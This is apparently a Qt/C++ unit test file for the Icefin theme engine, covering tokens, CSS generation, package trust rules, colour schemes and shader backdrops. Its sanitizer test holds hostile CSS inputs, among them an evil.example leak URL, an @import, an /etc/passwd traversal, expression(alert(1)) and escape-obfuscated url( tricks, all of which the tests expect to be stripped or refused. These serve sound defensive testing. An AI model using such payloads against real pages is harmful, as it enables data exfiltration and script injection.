// Unit tests for the theme engine's tokens and packages (PLAN 6.5) and the native backdrop's shaders (8.4).
#include <QtTest>
#include <QJsonDocument>
#include "icefin/theme/Tokens.h"
#include "icefin/theme/ThemePackage.h"
#include "icefin/theme/CssSanitizer.h"
#include "icefin/theme/ThemeScheme.h"
#include "icefin/theme/Backdrop.h"
#include <QTemporaryDir>

using namespace Icefin::Theme;

static QJsonObject json(const char* s) { return QJsonDocument::fromJson(s).object(); }

// ---- native backdrop fixtures (8.4) ----
static void writeFile(const QString& path, const QByteArray& bytes)
{
  QDir().mkpath(QFileInfo(path).path());
  QFile f(path);
  QVERIFY(f.open(QIODevice::WriteOnly));
  f.write(bytes);
}
static QString backdropPackage(const QString& dir, const char* shaderFile, const QByteArray& shader)
{
  writeFile(dir + "/theme.json", QByteArray("{\"schema\": 1, \"id\": \"bd-theme\", \"name\": \"B\", \"version\": \"1\", \"backdrop\": "
                                           "{\"shader\": \"") + shaderFile + "\", \"params\": {\"tint\": \"color.accent\", \"speed\": 0.5}, \"fps\": 24}}");
  QFile::copy(QString(ICEFIN_THEMES) + "/lab-contrast/tokens.json", dir + "/tokens.json");
  writeFile(dir + "/" + shaderFile, shader);
  return dir;
}

class TestTheme : public QObject
{
  Q_OBJECT
private slots:
  void flattenNestedAndValueObjects()
  {
    QStringList e;
    TokenMap t = flatten(json("{\"color\": {\"accent\": \"#123456\", \"focus\": {\"$value\": \"#abcdef\", \"$description\": \"x\"}}," "                                  \"shape\": {\"cardRadius\": 4}, \"$description\": \"ignored\"}"), &e);
    QVERIFY2(e.isEmpty(), qPrintable(e.join("; ")));
    QCOMPARE(t.value("color.accent"), QString("#123456"));
    QCOMPARE(t.value("color.focus"), QString("#abcdef"));
    QCOMPARE(t.value("shape.cardRadius"), QString("4"));
    QCOMPARE(t.size(), 3);
    flatten(json("{\"bad-name\": \"x\", \"color\": {\"list\": [1]}}"), &e);
    QCOMPARE(e.size(), 2);
  }
  void resolveReferencesAndCycles()
  {
    QStringList e;
    TokenMap r = resolve({{"a", "{b}"}, {"b", "{c}"}, {"c", "#010203"}, {"d", "1px solid {c}"}}, &e);
    QVERIFY(e.isEmpty());
    QCOMPARE(r.value("a"), QString("#010203"));
    QCOMPARE(r.value("d"), QString("1px solid #010203"));
    resolve({{"x", "{y}"}, {"y", "{x}"}}, &e);
    QVERIFY(e.join(" ").contains("cycle"));
    e.clear();
    resolve({{"x", "{nope}"}}, &e);
    QVERIFY(e.join(" ").contains("unknown"));
  }
  void channels()
  {
    QCOMPARE(colorChannel("#00a4dc"), QString("0 164 220"));
    QCOMPARE(colorChannel("#fff"), QString("255 255 255"));
    QCOMPARE(colorChannel("#11223344"), QString("17 34 51"));
    QCOMPARE(colorChannel("rgba(1, 2, 3, 0.5)"), QString("1 2 3"));
    QCOMPARE(colorChannel("rgb(10 20 30 / 50%)"), QString("10 20 30"));
    QVERIFY(colorChannel("red").isEmpty());
    QVERIFY(colorChannel("rgb(300, 0, 0)").isEmpty());
  }
  void validation()
  {
    TokenMap t;
    for (const QString& r : requiredTokens()) t[r] = r.startsWith("color.") ? "#000000" : "4px";
    QVERIFY(validate(t).isEmpty());
    TokenMap bad = t;
    bad.remove("color.focus");
    bad["color.accent"] = "url(x)";
    bad["font.family"] = "x; } body { display: none";
    const QStringList e = validate(bad);
    QCOMPARE(e.size(), 3);
    QVERIFY(e.join(" ").contains("missing required token 'color.focus'"));
  }
  void cssOutput()
  {
    const QString css = toCss({{"color.accent", "#00a4dc"}, {"shape.cardRadius", "0.5em"}});
    QVERIFY(css.contains("--icefin-color-accent: #00a4dc;"));
    QVERIFY(css.contains("--icefin-color-accent-channel: 0 164 220;"));
    QVERIFY(css.contains("--icefin-shape-cardRadius: 0.5em;"));
    QVERIFY(!css.contains("shape-cardRadius-channel"));
  }
  void fixturePackageLoadsWithPreset()
  {
    Package p = loadPackage(QString(ICEFIN_THEMES) + "/lab-contrast", Source::Development);
    QVERIFY2(p.ok(), qPrintable(p.errors.join("; ")));
    QCOMPARE(p.id, QString("lab-contrast"));
    QStringList e;
    TokenMap base = p.resolved(QString(), {}, &e);
    QVERIFY(e.isEmpty());
    QCOMPARE(base.value("color.background"), QString("#160b2e"));  // via {palette.ink}
    TokenMap green = p.resolved("green", {}, &e);
    QVERIFY(e.isEmpty());
    QCOMPARE(green.value("color.focus"), green.value("color.accent"));  // the preset's reference resolves after overlay
    QCOMPARE(green.value("color.accent"), QString("#1fa83a"));
    p.resolved("missing", {}, &e);
    QVERIFY(e.join(" ").contains("unknown preset"));
  }
  void brokenPackageIsRefused()
  {
    Package p = loadPackage(QString(ICEFIN_THEMES) + "/lab-broken", Source::User);
    QVERIFY(!p.ok());
    const QString all = p.errors.join("\n");
    QVERIFY(all.contains("cycle"));
    QVERIFY(all.contains("missing required token"));
    QVERIFY(all.contains("won't put in CSS"));
    QVERIFY(all.contains("not a #hex"));
    QVERIFY(!loadPackage("/nonexistent", Source::User).ok());
  }
  void sanitizer()
  {
    SanitizedCss s = sanitizeCss("@import url(https://evil.example/x.css);\n"
                                 ".a{background:url(img/bg.png)} .b{background:url('https://evil.example/leak?x')}\n"
                                 ".c{background:url(//evil.example/y)} .d{background-image:image-set(\"https://e/x.png\" 1x)}\n"
                                 ".e{background:url(../../etc/passwd)} .f{width:expression(alert(1))} /* url(http://in.comment) */\n"
                                 "@font-face{font-family:x;src:url(\"fonts/x.woff2\")}", "my-theme", "css/styles.css");
    QVERIFY2(s.refusedReason.isEmpty(), qPrintable(s.refusedReason));
    QVERIFY(!s.css.contains("evil"));
    QVERIFY(!s.css.contains("@import"));
    QVERIFY(!s.css.contains("image-set"));
    QVERIFY(!s.css.contains("expression("));
    QVERIFY(!s.css.contains("passwd"));
    QVERIFY(s.css.contains("url(\"icefin-theme://my-theme/css/img/bg.png\")"));
    QVERIFY(s.css.contains("url(\"icefin-theme://my-theme/css/fonts/x.woff2\")"));
    QVERIFY(s.removed.size() >= 5);
    // Escapes that spell ASCII are refused; non-ASCII ones (icon fonts) are fine.
    QVERIFY(!sanitizeCss(".a{background:\\75 rl(https://e/x)}", "t", "s.css").refusedReason.isEmpty());
    QVERIFY(!sanitizeCss(".a{background:u\\rl(https://e/x)}", "t", "s.css").refusedReason.isEmpty());
    QVERIFY(sanitizeCss(".i::before{content:\"\\f101\"}", "t", "s.css").refusedReason.isEmpty());
    // A url( the parser can't read is refused, not guessed.
    QVERIFY(!sanitizeCss(".a{background:url(\"x)}", "t", "s.css").refusedReason.isEmpty());
  }
  void trustRules()
  {
    Package user; user.source = Source::User;
    Package bundled; bundled.source = Source::Bundled;
    QVERIFY(mayServe(bundled, "a.js", false));
    QVERIFY(!mayServe(user, "a.js", false));
    QVERIFY(!mayServe(user, "a.svg", false));
    QVERIFY(mayServe(user, "a.css", false));
    QVERIFY(mayServe(user, "a.woff2", false));
    QVERIFY(mayServe(user, "a.js", true));
    QVERIFY(!mayServe(bundled, "a.exe", false));
  }
  void contentHashFollowsFiles()
  {
    QTemporaryDir d;
    QFile f(d.path() + "/a.css"); QVERIFY(f.open(QIODevice::WriteOnly)); f.write("x"); f.close();
    const QByteArray h1 = hashDirectory(d.path());
    QCOMPARE(hashDirectory(d.path()), h1);
    QVERIFY(f.open(QIODevice::WriteOnly)); f.write("y"); f.close();
    QVERIFY(hashDirectory(d.path()) != h1);
    QDir(d.path()).mkdir("sub");
    QFile g(d.path() + "/sub/b.js"); QVERIFY(g.open(QIODevice::WriteOnly)); g.write("z"); g.close();
    QVERIFY(hashDirectory(d.path()) != h1);
  }
  void unknownMetaKeyRefused()
  {
    QTemporaryDir d;
    QFile m(d.path() + "/theme.json"); QVERIFY(m.open(QIODevice::WriteOnly));
    m.write("{\"schema\": 1, \"id\": \"x-theme\", \"name\": \"X\", \"version\": \"1\", \"scrpits\": []}"); m.close();
    QFile::copy(QString(ICEFIN_THEMES) + "/lab-contrast/tokens.json", d.path() + "/tokens.json");
    Package p = loadPackage(d.path(), Source::User);
    QVERIFY(p.errors.join(" ").contains("unknown key 'scrpits'"));
  }
  // ---- colour schemes (9.20) ----
  void schemesLayerAfterPresets()
  {
    QTemporaryDir d;
    QFile m(d.path() + "/theme.json"); QVERIFY(m.open(QIODevice::WriteOnly));
    m.write("{\"schema\": 1, \"id\": \"x-theme\", \"name\": \"X\", \"version\": \"1\", \"presets\": {\"green\": {\"color\": {\"accent\": \"#1fa83a\"}}}, \"schemes\": {\"dark\": {\"tokens\": {\"color\": {\"background\": \"#000000\", \"accent\": \"#111111\"}}, \"presets\": {\"green\": {\"color\": {\"accent\": \"#0a5a1a\"}}}}}}");
    m.close();
    QFile::copy(QString(ICEFIN_THEMES) + "/lab-contrast/tokens.json", d.path() + "/tokens.json");
    Package p = loadPackage(d.path(), Source::User);
    QVERIFY2(p.ok(), qPrintable(p.errors.join("; ")));
    QCOMPARE(p.schemes.value("dark").name, QString("Dark"));  // named after its id when no name is given
    QStringList e;
    QCOMPARE(p.resolved(QString(), {}, &e, "dark").value("color.background"), QString("#000000"));
    QCOMPARE(p.resolved(QString(), {}, &e, "dark").value("color.accent"), QString("#111111"));
    QCOMPARE(p.resolved("green", {}, &e).value("color.accent"), QString("#1fa83a"));
    QCOMPARE(p.resolved("green", {}, &e, "dark").value("color.accent"), QString("#0a5a1a"));  // the scheme's preset override last
    QCOMPARE(p.resolved(QString(), {}, &e, "sepia"), p.resolved(QString(), {}, &e));  // a scheme it lacks: its own colours
    QVERIFY(e.isEmpty());
  }
  void badSchemesRefused()
  {
    QTemporaryDir d;
    QFile m(d.path() + "/theme.json"); QVERIFY(m.open(QIODevice::WriteOnly));
    m.write("{\"schema\": 1, \"id\": \"x-theme\", \"name\": \"X\", \"version\": \"1\", \"schemes\": {\"dark\": {\"colours\": {}, \"presets\": {\"nope\": {}}}, \"Bad Name\": {}}}");
    m.close();
    QFile::copy(QString(ICEFIN_THEMES) + "/lab-contrast/tokens.json", d.path() + "/tokens.json");
    const QString errs = loadPackage(d.path(), Source::User).errors.join(" | ");
    QVERIFY2(errs.contains("unknown key 'colours'"), qPrintable(errs));
    QVERIFY2(errs.contains("unknown preset 'nope'"), qPrintable(errs));
    QVERIFY2(errs.contains("scheme 'Bad Name'"), qPrintable(errs));
  }
  // ---- native backdrop (8.4) ----
  void backdropSpecParsing()
  {
    QStringList e;
    BackdropSpec b = parseBackdrop(QVariantMap{{"shader", "a.frag"}, {"params", QVariantMap{{"tint", "color.accent"}, {"speed", 0.5}}}, {"fps", 24}}, &e);
    QVERIFY2(e.isEmpty(), qPrintable(e.join("; ")));
    QCOMPARE(b.fps, 24);
    QCOMPARE(b.params.value("tint").toString(), QString("color.accent"));
    QVERIFY(!b.precompiled());
    e.clear();
    parseBackdrop(QVariantMap{{"shader", "a.glsl"}, {"params", QVariantMap{{"time", 1}, {"Bad", 1}, {"x", "notatoken"}}}, {"fps", 200}, {"extra", 1}}, &e);
    const QString all = e.join(" | ");
    QVERIFY(all.contains(".frag (GLSL body) or a precompiled .qsb"));
    QVERIFY(all.contains("'time' is not allowed") && all.contains("'Bad' is not allowed"));
    QVERIFY(all.contains("'x' must name a token"));
    QVERIFY(all.contains("fps must be 10-60") && all.contains("unknown key 'extra'"));
  }
  void cssColors()
  {
    QCOMPARE(cssColor("#ff8000"), QColor(255, 128, 0));
    QCOMPARE(cssColor("#ff800080").alpha(), 128);  // CSS order: alpha last
    QCOMPARE(cssColor("#f80"), QColor(255, 136, 0));
    QVERIFY(qAbs(cssColor("rgba(0, 0, 0, 0.5)").alphaF() - 0.5f) < 0.01f);
    QCOMPARE(cssColor("rgb(10 20 30)"), QColor(10, 20, 30));
    QVERIFY(!cssColor("red").isValid());
    QVERIFY(!cssColor("rgb(300, 0, 0)").isValid());
  }
  void backdropTypesFromTokens()
  {
    BackdropSpec b;
    b.shader = "a.frag";
    b.params = {{"tint", "color.accent"}, {"speed", 0.5}, {"radius", "shape.cardRadius"}, {"missing", "color.nope"}};
    QStringList e;
    const auto t = backdropTypes(b, TokenMap{{"color.accent", "#ff0000"}, {"shape.cardRadius", "0.8em"}}, &e);
    QCOMPARE(t.value("tint"), QString("color"));
    QCOMPARE(t.value("speed"), QString("number"));
    QVERIFY(e.join(" ").contains("'radius': token 'shape.cardRadius' is neither a colour nor a number"));
    QVERIFY(e.join(" ").contains("no token 'color.nope'"));
  }
  void backdropBakesAndChecks()
  {
    if (!backdropBakingAvailable()) QSKIP("built without Qt ShaderTools");
    const QMap<QString, QString> types{{"tint", "color"}, {"speed", "number"}};
    QString err;
    const QByteArray qsb = bakeBackdrop("void main() { fragColor = tint * (0.5 + 0.5 * sin(time * speed)) * qt_Opacity; }", types, &err);
    QVERIFY2(!qsb.isEmpty(), qPrintable(err));
    QVERIFY2(checkBackdropQsb(qsb, types, &err), qPrintable(err));
    // The same shader against a declaration it doesn't match is refused.
    QVERIFY(!checkBackdropQsb(qsb, {{"tint", "number"}, {"speed", "number"}}, &err));
    QVERIFY(err.contains("wrong type"));
    QVERIFY(!checkBackdropQsb(qsb, {{"speed", "number"}}, &err));
    QVERIFY(err.contains("isn't a declared param"));
    QVERIFY(!checkBackdropQsb("not a shader", types, &err));
    // A body can't bring its own header, and a syntax error is reported.
    QVERIFY(bakeBackdrop("#version 440\nvoid main() {}", types, &err).isEmpty());
    QVERIFY(bakeBackdrop("uniform float x;\nvoid main() { fragColor = tint; }", types, &err).isEmpty());
    QVERIFY2(!bakeBackdrop("// the uniform block is the engine's\nvoid main() { fragColor = tint; }", types, &err).isEmpty(), qPrintable(err));
    QVERIFY(bakeBackdrop("void main() { fragColor = nope; }", types, &err).isEmpty());
    QVERIFY(!err.isEmpty());
  }
  void backdropTrust()
  {
    // GLSL is for built-in themes; a user-installed theme must ship a precompiled .qsb.
    QTemporaryDir d1, d2;
    const QByteArray body = "void main() { fragColor = tint * qt_Opacity; }";
    QVERIFY(loadPackage(backdropPackage(d1.path(), "bd/a.frag", body), Source::Bundled).ok());
    Package user = loadPackage(backdropPackage(d2.path(), "bd/a.frag", body), Source::User);
    QVERIFY(user.errors.join(" ").contains("must be a precompiled .qsb"));
    // A shader outside the package is refused like any asset.
    QTemporaryDir d3;
    backdropPackage(d3.path(), "bd/a.frag", body);
    QFile m(d3.path() + "/theme.json"); QVERIFY(m.open(QIODevice::ReadOnly));
    QByteArray meta = m.readAll(); m.close();
    meta.replace("bd/a.frag", "../a.frag");
    writeFile(d3.path() + "/theme.json", meta);
    QVERIFY(loadPackage(d3.path(), Source::Bundled).errors.join(" ").contains("is not a file in the package"));
  }
};

QTEST_GUILESS_MAIN(TestTheme)
#include "test_theme.moc"
